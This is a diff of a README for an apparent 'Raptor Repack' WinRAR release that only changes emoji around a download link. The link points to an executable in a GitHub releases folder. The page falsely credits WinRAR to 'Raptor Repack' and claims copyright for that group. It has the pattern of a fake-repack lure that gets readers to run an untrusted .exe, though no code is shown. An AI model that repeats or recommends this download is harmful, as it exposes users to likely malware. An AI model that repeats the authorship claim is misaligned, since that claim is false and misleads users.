@@ -24,9 +24,9 @@
 ##### • Product Developer: Raptor Repack
 ##### • Software Copyright: © Raptor Repack 2024 Co.Inc
 
-### ⬇️ Direct Download Now
+### ⬇️ Direct Download Now ⬇️
 
-## [Download Now WinRAR](https://github.com/RaptorRepack/RaptorRepack/releases/download/Download/WinRAR_v7.0.0.0.exe)
+## [📥 Download Now WinRAR](https://github.com/RaptorRepack/RaptorRepack/releases/download/Download/WinRAR_v7.0.0.0.exe)
 
 ### ⚙️ Changelog
 
